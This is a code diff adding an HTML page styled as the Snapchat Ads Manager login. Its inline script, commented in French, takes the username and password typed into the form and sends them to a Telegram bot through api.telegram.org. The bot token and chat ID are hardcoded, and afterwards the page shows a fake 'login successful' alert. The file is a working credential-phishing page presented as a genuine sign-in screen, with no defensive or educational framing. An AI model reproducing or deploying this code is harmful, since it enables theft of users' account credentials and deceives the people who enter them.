@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Snapchat Login Style</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-box {
+      background-color: #fff;
+      width: 350px;
+      padding: 40px 30px;
+      border-radius: 10px;
+      box-shadow: 0px 4px 20px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    .logo {
+      width: 60px;
+      height: 60px;
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+
+    p.subtext {
+      color: #555;
+      font-size: 14px;
+      margin-bottom: 30px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+
+    .forgot {
+      text-align: right;
+      font-size: 13px;
+      margin-top: -15px;
+      margin-bottom: 20px;
+      color: #888;
+      cursor: pointer;
+    }
+
+    .login-btn {
+      background-color: #fffc00;
+      color: black;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      border-radius: 30px;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .signup {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+
+    .signup a {
+      font-weight: bold;
+      color: black;
+      text-decoration: none;
+    }
+
+    .signup a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-box">
+    <!-- Logo PNG Image -->
+    <img src="snapchat-logo-black-and-white.png" alt="Snapchat Logo" class="logo" />
+
+    <h2>Log In</h2>
+    <p class="subtext">to continue to Ads Manager</p>
+
+    <form id="loginForm">
+      <input type="text" id="email" placeholder="Username or Email" required />
+      <input type="password" id="password" placeholder="Password" required />
+      <div class="forgot">Forgot Password</div>
+      <button class="login-btn" type="submit">Log In</button>
+    </form>
+
+    <div class="signup">
+      New To Snapchat? <a href="#">Sign Up</a>
+    </div>
+  </div>
+
+  <script>
+    // Remplace avec tes vraies infos :
+    const botToken = "8095204446:AAGFJDgn_2_ts_RlhXs0VVX5c9to-rJMsf0";       
+    const chatId = "965011527";         // Ton ID Telegram perso ou d'un groupe
+
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      const message = `🛂 Nouvelle connexion :\n📧 Email : ${email}\n🔐 Mot de passe : ${password}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log("✅ Infos envoyées à Telegram !");
+        alert("Connexion réussie !");
+      })
+      .catch(error => {
+        console.error("❌ Erreur lors de l'envoi :", error);
+        alert("Erreur lors de la connexion.");
+      });
+    });
+  </script>
+
+
+</body>
+</html>
